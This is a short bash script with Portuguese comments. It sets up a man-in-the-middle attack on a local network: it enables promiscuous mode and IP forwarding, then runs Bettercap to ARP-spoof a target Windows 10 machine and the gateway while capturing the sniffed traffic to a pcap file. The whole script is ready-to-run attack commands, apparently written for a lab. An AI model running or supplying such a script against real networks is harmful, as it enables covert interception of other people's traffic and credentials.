#!/bin/bash

# Defina a interface de rede
INTERFACE="eth0"

# Endereço do gateway e alvo (agora com o IP correto do Windows 10)
GATEWAY="192.168.0.1"
TARGET="192.168.0.3"  # Substitua pelo IP do Windows 10

# Caminho do arquivo de captura
PCAP_FILE="capture.pcap"

# Ativa o modo promíscuo na interface
echo "Ativando o modo promíscuo na interface $INTERFACE..."
sudo ip link set $INTERFACE promisc on

# Habilita o encaminhamento de pacotes (IP Forwarding)
echo "Habilitando o IP Forwarding..."
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Inicia o Bettercap e configura ARP spoofing, além de iniciar a captura
echo "Iniciando o Bettercap com ARP spoofing e captura de pacotes em $PCAP_FILE..."
sudo bettercap -iface $INTERFACE -eval "set arp.spoof.targets $TARGET,$GATEWAY; set net.sniff.output $PCAP_FILE; arp.spoof on; net.sniff on"

